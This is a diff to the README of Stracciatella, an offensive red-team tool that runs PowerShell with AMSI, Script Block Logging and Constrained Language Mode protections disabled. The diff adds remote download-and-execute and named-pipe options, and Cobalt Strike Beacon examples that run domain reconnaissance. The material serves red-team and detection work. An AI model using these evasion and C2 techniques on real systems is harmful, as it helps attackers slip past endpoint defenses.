@@ -44,23 +44,30 @@ This project inherits from above researches and great security community in orde
 There are couple of options available:
 
 ```
+v:\vmshared\__RED_TEAM_TOOLS\Stracciatella>Stracciatella -h
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
   Mariusz B. / mgeeky, '19-20 <mb@binary-offensive.com>
-  v0.2
+  v0.3
 
 Usage: stracciatella.exe [options] [command]
   -s <path>, --script <path> - Path to file containing Powershell script to execute. If not options given, will enter
-                               a pseudo-shell loop.
+                               a pseudo-shell loop. This can be also a HTTP(S) URL to download & execute powershell script.
   -v, --verbose              - Prints verbose informations
   -n, --nocleanup            - Don't remove CLM disable leftovers (DLL files in TEMP and COM registry keys).
                                By default these are going to be always removed.
+  -C, --leaveclm             - Don't attempt to disable CLM. Stealthier. Will avoid leaving CLM disable artefacts undeleted.
   -f, --force                - Proceed with execution even if Powershell defenses were not disabled.
                                By default we bail out on failure.
-  -c, --command              - Executes the specified commands.
+  -c, --command              - Executes the specified commands You can either use -c or append commands after
+                               stracciatella parameters: cmd> straciatella ipconfig /all
                                If command and script parameters were given, executes command after running script.
   -x <key>, --xor <key>      - Consider input as XOR encoded, where <key> is a one byte key in decimal
                                (prefix with 0x for hex)
+  -p <name>, --pipe <name>   - Read powershell commands from a specified named pipe. Command must be preceded with 4 bytes of
+                               its length coded in little-endian (Length-Value notation).
+  -t <millisecs>, --timeout <millisecs>
+                             - Specifies timeout for pipe read operation (in milliseconds). Default: 60 secs. 0 - infinite.
   -e, --cmdalsoencoded       - Consider input command (specified in '--command') encoded as well.
                                Decodes input command after decoding and running input script file.
                                By default we only decode input file and consider command given in plaintext
@@ -150,10 +157,10 @@ Whereas:
 
 ## Cobalt Strike support
 
-Stracciatella comes with Aggressor script that when loaded exposes `stracciatella` command in the Beacon console. The usage is pretty much similar to `powerpick` (with support for `powershell-import`ed scripts). The input parameter will be xored with a random key. The advantage over `powerpick` is that the Stracciatella does not patch _AMSI.dll_ in the way like Powerpick does (_AmsiScanBuffer_ patch), thus potentially generating less forensic noise as seen by EDRs looking for in-memory patches. Also, Stracciatella will eventually be able to stabily bypass _Constrained Language Mode_ which is currently not possible using `powerpick`.:
+Stracciatella comes with Aggressor script that when loaded exposes `stracciatella` command in the Beacon console. The usage is pretty much similar to `powerpick` (by previously importing powershell scripts via `stracciatella-import`). The input parameter will be xored with a random key. The advantage over `powerpick` is that the Stracciatella does not patch _AMSI.dll_ in the way like Powerpick does (_AmsiScanBuffer_ patch), thus potentially generating less forensic noise as seen by EDRs looking for in-memory patches. Also, Stracciatella will eventually be able to stabily bypass _Constrained Language Mode_ which is currently not possible using `powerpick`.:
 
 ```
-beacon> powershell-import PowerView.ps1
+beacon> stracciatella-import PowerView.ps1
 [+] host called home, sent: 143784 bytes
 
 beacon> stracciatella Get-Domain
@@ -175,6 +182,34 @@ Name                    : eu.contoso.local
 ```
 
 Finally, Stracciatella may be easily used by some other tools/C2s that don't offer any functionality to evade powershell protections.
+
+Whenever `stracciatella` returns the 2 error (_ERROR_FILE_NOT_FOUND_) that is because Stracciatella timed out while internally awaiting for data to be written to its named pipe. 
+
+```
+beacon> stracciatella Resolve-IPAddress dc1.bank.corp
+[*] Tasked Beacon to run Stracciatella: Resolve-IPAddress dc1.bank.corp
+[+] [11/02 03:32:50] host called home, sent: 1007245 bytes
+[+] [11/02 03:33:13] host called home, sent: 191805 bytes
+[-] Could not connect to pipe (\\.\pipe\85f2acfe-2ca9-4364-af08-f1c654966c1a): 2.
+```
+
+This can be remediated however by adjusting Straciatella's timeout parameter using:
+
+```
+beacon> stracciatella-timeout 600000
+beacon> stracciatella Resolve-IPAddress dc1.bank.corp
+[*] Tasked Beacon to run Stracciatella: Resolve-IPAddress dc1.bank.corp
+[+] [11/02 04:01:11] host called home, sent: 1007265 bytes
+[+] [11/02 04:01:33] host called home, sent: 191805 bytes
+[+] received output:
+
+ComputerName  IPAddress 
+------------  --------- 
+dc1.bank.corp 10.10.10.5
+
+```
+
+The associated aggressor script leverages internal Beacon routines to write to a randomly named pipe, that on the other end will be listened upon by Stracciatella's logic. Receiver end will await for inbound data for some period of time (`--timeout` parameter in Stracciatella's options, defaults to 60 seconds) and given there so no data - will time out and abort gently. Otherwise, received commands will be decoded and executed as usual.
 
 
 ## How do you disable AMSI & Script Block logging?
@@ -247,10 +282,9 @@ Currently, the way the Stracciatella provides runspace for powershell commands i
 
 - **Currently not able to perform a full cleanup of CLM disabling artefacts: DLL files in-use, left in %TEMP%.**
 - **Currently only supports .NET Framework 4.5+**
-- Create fully unmanaged powershell runspace
 - Implement rolling XOR with 2,3 and 4 bytes long key.
-- _Add Constrained Language Mode bypass_
 - Implement more encoding/encryption strategies, especially ones utilising environmental keying
+- ~Add Constrained Language Mode bypass~
 - ~Disable Script Block logging first, than go after AMSI~
 - ~Clean essential variables ASAP, preventing easy process memory dumping and recovery of provided scripts/commands~
 - Add Tab-autocompletion and support for Up/Down arrows (having provided that plaintext commands are not going to be stored in Straciatella's memory)
